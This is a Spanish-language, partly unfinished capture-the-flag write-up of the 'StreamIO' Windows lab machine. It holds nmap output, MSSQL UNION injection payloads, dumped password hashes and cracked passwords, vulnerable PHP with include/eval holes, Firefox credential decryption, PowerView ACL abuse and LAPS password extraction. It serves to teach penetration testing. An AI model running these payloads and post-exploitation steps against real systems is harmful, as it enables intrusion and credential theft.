# StreamIO

## Tabla de Contenido <!-- omit from toc -->

- [Introducción](#introducción)
  - [Técnicas vistas / Tags](#técnicas-vistas--tags)
  - [Estadísticas](#estadísticas)
- [Reconocimiento](#reconocimiento)
  - [Escaneo de host](#escaneo-de-host)
    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
    - [Escaneo específico](#escaneo-específico)
- [Enumeración](#enumeración)
  - [Servicios](#servicios)
    - [Nombre de servicio - Puerto](#nombre-de-servicio---puerto)
      - [Manual](#manual)
      - [Nombre de herramienta](#nombre-de-herramienta)
- [Explotación](#explotación)
  - [SQL Injection](#sql-injection)
    - [Pasos previos | Preparación](#pasos-previos--preparación)
    - [Ejecución](#ejecución)
- [Post Explotación](#post-explotación)
  - [Enumeración](#enumeración-1)
  - [Escalación de privilegios](#escalación-de-privilegios)
- [Conclusión](#conclusión)
- [Notas adicionales](#notas-adicionales)
- [Referencias](#referencias)


## Introducción

### Técnicas vistas / Tags

- Técnica 1
- Técnica 2
- Técnica 3

### Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [StreamIO]() |
| OS | Windows |
| Dificultad oficial | Medium |
| Dificultad de comunidad | ![Dificultad]() |
| Puntos | 20 |
| Creadores | [Creator]() |

## Reconocimiento

### Escaneo de host

#### Escaneo completo de puertos

```bash
└─$ sudo nmap -sS -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-25 00:57 EDT
Initiating SYN Stealth Scan at 00:57
Scanning 10.10.11.158 [65535 ports]
Discovered open port 443/tcp on 10.10.11.158
Discovered open port 80/tcp on 10.10.11.158
Discovered open port 135/tcp on 10.10.11.158
Discovered open port 53/tcp on 10.10.11.158
Discovered open port 139/tcp on 10.10.11.158
Discovered open port 445/tcp on 10.10.11.158
Discovered open port 5985/tcp on 10.10.11.158
Discovered open port 3269/tcp on 10.10.11.158
SYN Stealth Scan Timing: About 12.08% done; ETC: 01:01 (0:03:46 remaining)
Discovered open port 464/tcp on 10.10.11.158
Discovered open port 3268/tcp on 10.10.11.158
SYN Stealth Scan Timing: About 26.50% done; ETC: 01:01 (0:02:49 remaining)
Discovered open port 49673/tcp on 10.10.11.158
Discovered open port 49702/tcp on 10.10.11.158
SYN Stealth Scan Timing: About 45.03% done; ETC: 01:00 (0:01:51 remaining)
Discovered open port 389/tcp on 10.10.11.158
Discovered open port 49674/tcp on 10.10.11.158
SYN Stealth Scan Timing: About 55.95% done; ETC: 01:01 (0:01:35 remaining)
Discovered open port 9389/tcp on 10.10.11.158
Discovered open port 55172/tcp on 10.10.11.158
Discovered open port 593/tcp on 10.10.11.158
Discovered open port 636/tcp on 10.10.11.158
SYN Stealth Scan Timing: About 67.65% done; ETC: 01:01 (0:01:12 remaining)
Discovered open port 88/tcp on 10.10.11.158
SYN Stealth Scan Timing: About 51.47% done; ETC: 01:03 (0:02:51 remaining)
SYN Stealth Scan Timing: About 61.78% done; ETC: 01:03 (0:02:11 remaining)
SYN Stealth Scan Timing: About 75.47% done; ETC: 01:02 (0:01:18 remaining)
SYN Stealth Scan Timing: About 88.15% done; ETC: 01:02 (0:00:36 remaining)
Discovered open port 49667/tcp on 10.10.11.158
Completed SYN Stealth Scan at 01:02, 306.35s elapsed (65535 total ports)
Nmap scan report for 10.10.11.158
Host is up (0.14s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49702/tcp open  unknown
55172/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 306.44 seconds
           Raw packets sent: 196774 (8.658MB) | Rcvd: 221 (9.724KB)
```

#### Escaneo específico

```bash
└─$ nmap -sCV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49702,55172 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-25 01:06 EDT
Nmap scan report for 10.10.11.158
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-25 12:06:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2023-04-25T12:07:41+00:00; +7h00m00s from scanner time.
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49702/tcp open  msrpc         Microsoft Windows RPC
55172/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-time:
|   date: 2023-04-25T12:07:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.92 seconds
```

## Enumeración

### Servicios

#### Nombre de servicio - Puerto

##### Manual



##### Nombre de herramienta



## Explotación

### SQL Injection

```
10' union select 1,(SELECT name),3,4,5,6 FROM STREAMIO..sysobjects WHERE xtype = 'U'-- -
```

```
10' union select 1,(SELECT name),3,4,5,6 FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users')-- 
```

```
10' union select 1,(SELECT username+':'+password),3,4,5,6 FROM users-- -
```

```
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:08344b85b329d7efd611b7a7743e8a09
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
Thane:3577c47eb1e12c8ba021611e1280753c
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
```

```
admin:paddpadd
Barry:$hadoW
Clara:%$clara
Juliette:$3xybitch
Lauren:##123a8j8w5123##
Lenord:physics69i
Michelle:!?Love?!123
Sabrina:!!sabrina$
Thane:highschoolmusical
Victoria:!5psycho8!
yoshihide:66boysandgirls..
```

admin_index.php

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Admin panel</title>
	<link rel = "icon" href="/images/icon.png" type = "image/x-icon">
	<!-- Basic -->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
	<!-- Site Metas -->
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

	<!-- Custom styles for this template -->
	<link href="/css/style.css" rel="stylesheet" />
	<!-- responsive style -->
	<link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
	<center class="container">
		<br>
		<h1>Admin panel</h1>
		<br><hr><br>
		<ul class="nav nav-pills nav-fill">
			<li class="nav-item">
				<a class="nav-link" href="?user=">User management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?staff=">Staff management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?movie=">Movie management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?message=">Leave a message for admin</a>
			</li>
		</ul>
		<br><hr><br>
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>
```

admin_master.php

```php
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

#### Pasos previos | Preparación



#### Ejecución



## Post Explotación

### Enumeración



### Escalación de privilegios

```sql
SQL> SELECT name FROM master.dbo.sysdatabases;
name

--------------------------------------------------------------------------------------------------------------------------------

master

tempdb

model

msdb

STREAMIO

streamio_backup

SQL> use streamio_backup;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: streamio_backup
[*] INFO(DC): Line 1: Changed database context to 'streamio_backup'.

SQL> select * from users;
         id   username                                             password

-----------   --------------------------------------------------   --------------------------------------------------

          1   nikk37                                               389d14cb8e4e9b94b137deb1caf0612a

          2   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332

          3   James                                                c660060492d9edcaa8332d89c99c9239

          4   Theodore                                             925e5408ecb67aea449373d668b7359e

          5   Samantha                                             083ffae904143c4796e464dac33c1f7d

          6   Lauren                                               08344b85b329d7efd611b7a7743e8a09

          7   William                                              d62be0dc82071bccc1322d64ec5b6c51

          8   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5

SQL>
```

```
nikk37:get_dem_girls2@yahoo.com
```

```
gci C:\ *.json -file -ea silent -recurse -force
```

Logins.json para cracking de firefox

```powershell
*Evil-WinRM* PS C:\Users> gci C:\Users *.json -file -ea silent -recurse -force


    Directory: C:\Users\All Users\Microsoft\Windows\Models


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   1:48 AM             41 ModelPayload.json


    Directory: C:\Users\All Users\Microsoft\Windows\OneSettings


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   1:48 AM           2142 config.json
-a----         5/9/2022   9:15 PM          67866 CTAC.json


    Directory: C:\Users\All Users\Microsoft\Windows Defender\Platform\4.18.2202.4-0


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/28/2022   2:23 PM            350 com.microsoft.defender.be.chrome.json


    Directory: C:\Users\All Users\Microsoft\Windows Defender\Platform\4.18.2203.5-0


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/9/2022   6:03 PM            350 com.microsoft.defender.be.chrome.json


    Directory: C:\Users\All Users\Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   3:18 AM             78 profile_count_E7CF176E110C211B.json
-a----        2/25/2022  11:17 PM           7087 uninstall_ping_E7CF176E110C211B_2ad05646-d1c2-4676-a63d-3ab4fb83215e.json


    Directory: C:\Users\All Users\Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38\updates\E7CF176E110C211B


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   2:40 AM             78 update-config.json


    Directory: C:\Users\nikk37\AppData\Local\Mozilla\Firefox\Profiles\br53rxeg.default-release


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   2:42 AM          31221 activity-stream.discovery_stream.json


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   2:40 AM             47 times.json


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:40 AM            778 handlers.json
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
-a----        2/22/2022   2:41 AM           2081 logins.json
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:42 AM            141 xulstore.json


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\datareporting


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   2:42 AM            161 session-state.json
-a----        2/22/2022   2:40 AM             51 state.json
```


Keys para cracking de firefox

```powershell
*Evil-WinRM* PS C:\Users> gci C:\Users *.db -file -ea silent -recurse -force


    Directory: C:\Users\All Users\Microsoft\Windows\Caches


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   3:01 PM          16384 cversions.2.db
-a----        3/28/2022   4:49 PM         294624 {6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000002.db
-a----        3/28/2022   4:49 PM         635712 {DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000002.db


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM         294912 key4.db
```

```
└─$ python firepwd.py -d ../
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

```powershell
$userName = 'streamio.htb\JDgodd'
$userPassword = 'JDg0dd1s@d0p3cr3@t0r'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

Add-DomainObjectAcl -Credential $credObject -Identity 'CORE STAFF' -Rights WriteMembers

Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Credential $credObject

Get-DomainGroupMember -Identity 'CORE STAFF'

Set-DomainObjectOwner -Credential $credObject -Identity 'CORE STAFF' -OwnerIdentity JDgodd


Add-DomainObjectAcl -Credential $credObject -TargetIdentity 'CORE STAFF' -principalidentity 'streamio\\JDgodd'
```

```powershell
*Evil-WinRM* PS C:\Users\nikk37\downloads> Add-DomainObjectAcl -Credential $credObject -TargetIdentity 'CORE STAFF' -principalidentity 'streamio\\JDgodd'


*Evil-WinRM* PS C:\Users\nikk37\downloads> Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Credential $credObject
*Evil-WinRM* PS C:\Users\nikk37\downloads> Get-DomainGroupMember -Identity 'CORE STAFF'


GroupDomain             : streamIO.htb
GroupName               : CORE STAFF
GroupDistinguishedName  : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb
MemberDomain            : streamIO.htb
MemberName              : JDgodd
MemberDistinguishedName : CN=JDgodd,CN=Users,DC=streamIO,DC=htb
MemberObjectClass       : user
MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104



*Evil-WinRM* PS C:\Users\nikk37\downloads>
```

```powershell
*Evil-WinRM* PS C:\Users\nikk37\downloads> .\SharpLAPS.exe /host:127.0.0.1 /user:JDgodd /pass:JDg0dd1s@d0p3cr3@t0r

   _____ __                     __    ___    ____  _____
  / ___// /_  ____ __________  / /   /   |  / __ \/ ___/
  \__ \/ __ \/ __ `/ ___/ __ \/ /   / /| | / /_/ /\__ \
 ___/ / / / / /_/ / /  / /_/ / /___/ ___ |/ ____/___/ /
/____/_/ /_/\__,_/_/  / .___/_____/_/  |_/_/    /____/
                     /_/

[+] Using the following credentials
Host: LDAP://127.0.0.1:389
User: JDgodd
Pass: JDg0dd1s@d0p3cr3@t0r

[+] Extracting LAPS password from LDAP
Machine  : DC$
Password : #23Qk0i0AkCv2u
```


## Conclusión


## Notas adicionales


## Referencias

